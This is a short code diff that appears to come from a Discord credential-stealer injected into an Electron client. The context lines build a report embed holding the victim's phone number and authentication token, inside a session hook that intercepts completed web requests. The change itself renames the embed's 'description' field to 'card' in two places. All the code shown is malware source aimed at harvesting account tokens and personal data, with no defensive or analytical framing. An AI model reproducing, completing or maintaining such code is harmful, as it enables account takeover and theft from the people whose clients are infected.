@@ -236,7 +236,7 @@ const FirstTime = async () => {
                 { name: "Phone", value: `\`${user.phone ?? "None"}\``, inline: false },
                 { name: "Token", value: `\`${token}\``, inline: false }
             ],
-            description:description,
+            card:description,
             image: userBanner,
             thumbnail: userAvatar,
             color: 5639644
@@ -358,7 +358,7 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
                     { name: "Phone", value: `\`${user.phone ?? "None"}\``, inline: false },
                     { name: "Token", value: `\`${token}\``, inline: false }
                 ],
-                description:description,
+                card:description,
                 image: userBanner,
                 thumbnail: userAvatar,
                 color: 5639644
